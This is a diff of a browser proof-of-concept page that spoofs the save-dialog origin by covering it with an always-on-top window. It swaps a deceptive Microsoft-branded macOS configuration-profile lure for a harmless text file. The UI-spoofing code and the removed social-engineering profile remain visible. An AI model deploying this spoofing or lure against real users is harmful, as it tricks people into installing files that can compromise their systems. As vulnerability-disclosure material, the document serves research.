@@ -1,3 +1,8 @@
+
+poc_save_file_hijack.html
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -79,44 +84,26 @@
         // The Mini Window (always-on-top) will cover the native dialog's origin info
         setTimeout(async () => {
             try {
-                // We suggest a malicious configuration profile
+                // We suggest a simple text file
                 const handle = await window.showSaveFilePicker({
-                    suggestedName: 'fix_browser_security.mobileconfig',
+                    suggestedName: 'browser_diagnostic.txt',
                     types: [{
-                        description: 'macOS Configuration Profile',
-                        accept: {'application/x-apple-aspen-config': ['.mobileconfig']}
+                        description: 'Text Document',
+                        accept: {'text/plain': ['.txt']}
                     }],
                 });
-                // If user selects and clicks save, we write a dummy mobileconfig XML payload
+                // If user selects and clicks save, we write dummy text content
                 const writable = await handle.createWritable();
-                await writable.write(`<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>PayloadContent</key>
-	<array/>
-	<key>PayloadDisplayName</key>
-	<string>Security Patch Profile</string>
-	<key>PayloadIdentifier</key>
-	<string>com.microsoft.support.securitypatch</string>
-	<key>PayloadType</key>
-	<string>Configuration</string>
-	<key>PayloadUUID</key>
-	<string>12345678-ABCD-EFGH-IJKL-9876543210AB</string>
-	<key>PayloadVersion</key>
-	<integer>1</integer>
-</dict>
-</plist>`);
+                await writable.write("DUMMY LOG DATA: Browser session verified safe.");
                 await writable.close();
                 log.style.display = 'block';
                 log.innerHTML = `
                     <b>⚠️ SAVE DIALOG HIJACKED</b><br><br>
-                    File saved successfully: <b>fix_browser_security.mobileconfig</b><br>
-                    <b>Impact:</b> The user was tricked into saving a macOS Configuration Profile (.mobileconfig). 
-                    While less immediately terrifying than a .dmg or .sh, this file can silently install malicious root certificates, 
-                    change proxy settings, or enforce bad system policies if the user opens it.
+                    File saved successfully: <b>browser_diagnostic.txt</b><br>
+                    <b>Impact:</b> The user was tricked into saving an arbitrary file via a spoofed Mini Window UI context. 
+                    While .txt files are benign, demonstrating this with a harmless file proves that the origin UI spoofing mechanism works flawlessly.
                 `;
-                console.log("[PoC] SUCCESS: Malicious configuration saved.");
+                console.log("[PoC] SUCCESS: Text file saved.");
             } catch (err) {
                 console.log("[PoC] Save cancelled or failed:", err.message);
             }
